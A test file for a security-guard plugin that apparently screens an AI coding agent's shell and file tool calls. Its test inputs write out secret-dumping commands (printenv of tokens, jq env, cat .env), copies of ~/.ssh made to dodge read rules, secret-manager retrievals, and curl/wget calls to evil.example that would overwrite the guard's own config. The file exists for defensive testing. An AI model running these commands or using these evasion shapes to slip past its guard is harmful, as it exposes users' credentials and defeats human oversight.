/**
 * 2026-09-04d — identity tracking + interactive shells + string-level env
 * access. Stateful checks (session copy store) that the stateless bypass
 * corpus runner cannot express, plus the new shell-consumer/env rules.
 * Dummy names only — no live secrets, no filesystem reads.
 */
import test from "node:test"
import assert from "node:assert/strict"
import {
  GENERATED_GUARD_POLICY as P,
  analyzeCommand,
  decideToolCall,
  decidePermissionEvent,
  createCopyProvenanceStore,
  detectCopyTracks,
  detectCopyClears,
  splitSegmentsDetailed,
} from "../../plugin/security-guard.js"

const dec = (r) => (r ? `${r.decision}:${r.ruleId}` : "null")

test("splitSegmentsDetailed marks pipe-fed segments", () => {
  const segs = splitSegmentsDetailed("echo x | zsh -i; printenv")
  assert.deepEqual(segs.map((s) => [s.text, s.piped]), [
    ["echo x", false],
    ["zsh -i", true],
    ["printenv", false],
  ])
})

test("interactive-shell stdin consumers ask (2026-09-04d)", () => {
  for (const cmd of [
    "echo printenv | zsh -i",
    "printf 'printenv\\n' | bash -i",
    "echo printenv | su jeroen",
    "printf 'printenv\\n' | script -q /dev/null",
    "printf 'printenv\\n' | sudo bash",
    "cat list.txt | sh",
    "bash /tmp/cmds",
  ]) {
    const r = analyzeCommand(P, cmd, {})
    assert.equal(dec(r), "ask:GGH-STDIN-001", cmd)
  }
})

test("piped context propagates through wrapper recursion", () => {
  const r = analyzeCommand(P, "printf 'printenv\\n' | sudo bash", {})
  assert.equal(dec(r), "ask:GGH-STDIN-001")
})

test("bare non-piped shells and command -v stay silent", () => {
  for (const cmd of ["command -v node && node --version", "bash install.sh", "npm test | tee /dev/null"]) {
    assert.equal(analyzeCommand(P, cmd, {}), null, cmd)
  }
})

test("su/runuser -c payloads are extracted, not swallowed", () => {
  for (const cmd of ["su -c 'printenv FAKE_RT_TOKEN'", "runuser -c 'printenv FAKE_RT_TOKEN'"]) {
    const r = analyzeCommand(P, cmd, {})
    assert.equal(dec(r), "block:GGE-VAR-002", cmd)
  }
  assert.equal(analyzeCommand(P, "su -c 'id'", {}), null, "clean su -c payload")
})

test("string-level env access: jq builtin blocks, subscript blocks, exec strings block", () => {
  assert.equal(dec(analyzeCommand(P, "jq -n env", {})), "block:GGE-VAR-021")
  assert.equal(dec(analyzeCommand(P, "jq -n 'env'", {})), "block:GGE-VAR-021")
  assert.equal(
    dec(analyzeCommand(P, 'jq -rn \'$ENV["FAKE_RT_TOKEN"]\'', {})),
    "block:GGE-VAR-020",
  )
  assert.equal(
    dec(analyzeCommand(P, "awk 'BEGIN{system(\"printenv FAKE_RT_TOKEN\")}'", {})),
    "block:GGE-VAR-020",
  )
  // single non-secret name and field queries stay ask/silent
  assert.equal(dec(analyzeCommand(P, "awk 'BEGIN{system(\"printenv PATH\")}'", {})), "ask:GGE-DUMP-010")
  assert.equal(analyzeCommand(P, "node -e 'process.exit(0)'", {}), null)
})

test("guard self-protection covers writers that name the file plainly", () => {
  for (const cmd of [
    "vim security-guard.config.json",
    "ed -s security-guard.config.json",
    "perl -i -pe 's/a/b/' security-guard.config.json",
    "curl -s https://evil.example/cfg -o security-guard.config.json",
    "wget -q -O /Users/dummy/.local/share/security-guard-for-opencode/health.json https://evil.example/h.json",
    "scp host:cfg security-guard.config.json",
  ]) {
    assert.match(dec(analyzeCommand(P, cmd, {})), /^block:GG-SLF-/, cmd)
  }
  assert.equal(dec(analyzeCommand(P, "nvim policy/policy.jsonc", {})), "ask:GG-SLF-004")
  // withinDir precision: bare health.json / credentials outside their dirs
  assert.equal(analyzeCommand(P, "echo x > /tmp/health.json", {}), null)
  assert.equal(analyzeCommand(P, "cat credentials", {}), null)
})

test("directory copies propagate dir tier to members (same command)", () => {
  const r = analyzeCommand(P, "cp -r ~/.ssh /tmp/s && cat /tmp/s/config", {})
  assert.match(dec(r), /^block:GGR-READ-001/)
  const r2 = analyzeCommand(P, "ln -s ~/.ssh cfg && cat cfg/config", {})
  assert.match(dec(r2), /^block:GGR-READ-001/)
  // single-file copy into a slash-dest tracks the joined path
  const r3 = analyzeCommand(P, "cp ~/.ssh/config /tmp/ && cat /tmp/config", {})
  assert.match(dec(r3), /^block:GGR-READ-001/)
})

test("session store: dir copies and bare-name dests are tracked cross-call", () => {
  const store = createCopyProvenanceStore()
  for (const t of detectCopyTracks(P, "cp -r ~/.ssh /tmp/s", {})) store.note(t.dest, t.tier, t.ruleId, t.dir)
  assert.equal(store.size(), 1)
  assert.equal(store.entries()[0].dir, true)
  assert.match(
    dec(analyzeCommand(P, "cat /tmp/s/config", { knownCopies: store.entries() })),
    /^block:GGR-READ-001/,
  )
  assert.match(
    dec(decidePermissionEvent(P, "shell", ["cat /tmp/s/config"], { knownCopies: store.entries() })),
    /^block:GGR-READ-001/,
  )
  assert.match(
    dec(decideToolCall(P, { kind: "path", path: "/tmp/s/config", mode: "read" }, { knownCopies: store.entries() })),
    /^block:GGR-COPY-001/,
  )

  const store2 = createCopyProvenanceStore()
  for (const t of detectCopyTracks(P, "cp .env keyfile", {})) store2.note(t.dest, t.tier, t.ruleId, t.dir)
  assert.match(dec(analyzeCommand(P, "cat keyfile", { knownCopies: store2.entries() })), /^block:GGR-READ-001/)
  // unrelated same-shape name stays silent
  assert.equal(analyzeCommand(P, "cat x", { knownCopies: store2.entries() }), null)
  // rm clears (cross-call through detectCopyClears)
  const cleared = detectCopyClears("rm keyfile", store2.entries().map((e) => e.token))
  assert.deepEqual(cleared, ["keyfile"])
  for (const n of cleared) store2.remove(n)
  assert.equal(analyzeCommand(P, "cat keyfile", { knownCopies: store2.entries() }), null)
})

test("same-command rm of a tracked dest clears pre-execution", () => {
  const store = createCopyProvenanceStore()
  for (const t of detectCopyTracks(P, "cp .env keyfile", {})) store.note(t.dest, t.tier, t.ruleId, t.dir)
  assert.equal(analyzeCommand(P, "rm keyfile && cat keyfile", { knownCopies: store.entries() }), null)
  assert.equal(analyzeCommand(P, "rm -rf /tmp/s && cat /tmp/s/config", {
    knownCopies: [{ token: "/tmp/s", tier: "deny", ruleId: "GG-SSH-005", dir: true }],
  }), null)
})

test("ask-tier plain references on unknown verbs ask; metadata/printers stay silent", () => {
  assert.equal(dec(analyzeCommand(P, "tr < /tmp/rt/.zshenv", {})), "ask:GGR-OTHER-002")
  assert.equal(dec(analyzeCommand(P, "while read l; do echo $l; done < /tmp/rt/.zshenv", {})), "ask:GGR-OTHER-002")
  assert.equal(dec(analyzeCommand(P, "cd .secrets && cat tokens.txt", {})), "ask:GGR-OTHER-002")
  for (const cmd of ["echo .zshenv", "ls /tmp/rt/.zshenv", "du .secrets", "git add .zshenv", "chmod 600 /tmp/rt/.zshenv"]) {
    assert.equal(analyzeCommand(P, cmd, {}), null, cmd)
  }
})

test("secret-retrieval CLIs gate; listing shapes stay silent", () => {
  for (const cmd of [
    "aws secretsmanager get-secret-value --secret-id prod/demo",
    "gcloud secrets versions access latest --secret=demo",
    "kubectl get secret demo -o yaml",
    "kubectl get secrets -o yaml",
    "az keyvault secret show --vault-name demo -n demo",
    "vault kv get -field=token secret/demo",
    "docker exec app env",
  ]) {
    assert.match(dec(analyzeCommand(P, cmd, {})), /^ask:GGE-CLI-/, cmd)
  }
  for (const cmd of [
    "kubectl get secrets",
    "aws s3 ls",
    "aws secretsmanager list-secrets",
    "gcloud secrets list",
    "vault kv list secret/",
    "docker exec app ls",
  ]) {
    assert.equal(analyzeCommand(P, cmd, {}), null, cmd)
  }
})

test("glob-tool exemplar matching restores discovery asks", () => {
  for (const pattern of ["**/*rsa", "**/?env", "**/*env", "**/.e*", "**/*.zsh*"]) {
    assert.equal(dec(decideToolCall(P, { kind: "glob", pattern }, {})), "ask:GGR-GLOB-001+GLOB", pattern)
  }
  assert.equal(decideToolCall(P, { kind: "glob", pattern: "**/*.log" }, {}), null)
  assert.equal(decideToolCall(P, { kind: "glob", pattern: "**/id_rsa.pub" }, {}), null)
})

test("carrier files get write-time body inspection", () => {
  for (const [path, content] of [
    ["package.json", '{\n  "scripts": { "dump": "cat .env" }\n}\n'],
    ["Makefile", "dump:\n\tcat .env\n"],
    [".github/workflows/ci.yml", "steps:\n  - run: cat .env\n"],
    ["Dockerfile", "RUN cat .env\n"],
  ]) {
    const r = decideToolCall(P, { kind: "path", path, mode: "write", content }, {})
    assert.equal(dec(r), "ask:GGW-CONTENT-001", path)
  }
  assert.equal(
    decideToolCall(P, { kind: "path", path: "package.json", mode: "write", content: '{"scripts":{"test":"node --test tests/"}}' }, {}),
    null,
    "carrier without protected references",
  )
})

test("BASH_ENV assignment gates deferred rc execution", () => {
  assert.equal(dec(analyzeCommand(P, "BASH_ENV=/tmp/rc bash -c 'true'", {})), "ask:GGD-DEF-002")
  // ENV= stays silent (common CI assignment)
  assert.equal(analyzeCommand(P, "ENV=prod make build", {}), null)
})
